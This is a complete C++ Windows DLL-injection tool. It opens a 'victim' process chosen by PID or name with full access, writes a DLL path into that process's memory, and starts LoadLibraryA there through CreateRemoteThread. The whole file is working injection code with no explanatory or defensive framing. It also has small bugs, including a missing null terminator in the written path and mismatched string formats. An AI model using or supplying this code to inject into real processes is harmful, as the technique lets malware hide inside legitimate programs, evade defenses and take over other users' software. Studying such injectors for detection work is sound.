#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <wchar.h>

// #define PROCESS_NAME

HANDLE findProcess(WCHAR* processName);

BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath);


int wmain(int argc, wchar_t* argv[])
{
	char dllPath[MAX_PATH] = { 0x0 };
	memset(dllPath, 0, MAX_PATH);

	wcstombs(dllPath, argv[2], MAX_PATH);

	// wprint to print WCHAR strings
	wprintf(L"Victim process name	: %s\n", argv[1]);
	wprintf(L"DLL to inject		: %s\n", argv[2]);

#ifndef PROCESS_NAME 
	int pid = wcstol(argv[1], NULL, 10);
	printf("the pid is %d\n", pid);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
#else
	HANDLE hProcess = findProcess(argv[1]);
#endif


	if (hProcess != NULL) {
		BOOL injectSuccessful = loadRemoteDLL(hProcess, dllPath);
		if (injectSuccessful) {
			printf("[+] DLL injection successful! \n");
			getchar();
		}
		else {
			printf("[---] DLL injection failed. \n");
			getchar();
		}
	}
}


HANDLE findProcess(WCHAR* processName) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printf("[---] Could not create snapshot.\n");
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32)) {
		CloseHandle(hProcessSnap);
		return FALSE;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do {

		if (!wcscmp(pe32.szExeFile, processName)) {
			wprintf(L"[+] The process %s was found in memory.\n", pe32.szExeFile);

			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL) {
				return hProcess;
			}
			else {
				printf("[---] Failed to open process %s.\n", pe32.szExeFile);
				return NULL;

			}
		}

	} while (Process32Next(hProcessSnap, &pe32));

	printf("[---] %s has not been loaded into memory, aborting.\n", processName);
	return NULL;
}


BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath) {
	printf("Enter any key to attempt DLL injection.");
	getchar();

	// Allocate memory for DLL's path name to remote process
	printf("\n the dll path is %s\n", dllPath);

	LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (dllPathAddressInRemoteMemory == NULL) {
		printf("[---] VirtualAllocEx unsuccessful.\n");
		getchar();
		return FALSE;
	}

	// Write DLL's path name to remote process
	BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);

	if (!succeededWriting) {
		printf("[---] WriteProcessMemory unsuccessful.\n");
		getchar();
		return FALSE;
	}
	else {
		// Returns a pointer to the LoadLibrary address. This will be the same on the remote process as in our current process.
		LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
		if (loadLibraryAddress == NULL) {
			printf("[---] LoadLibrary not found in process.\n");
			getchar();
			return FALSE;
		}
		else {
			HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, NULL, NULL);
			if (remoteThread == NULL) {
				printf("[---] CreateRemoteThread unsuccessful.\n");
				return FALSE;
			}
		}
	}
	CloseHandle(hProcess);
	return TRUE;
}

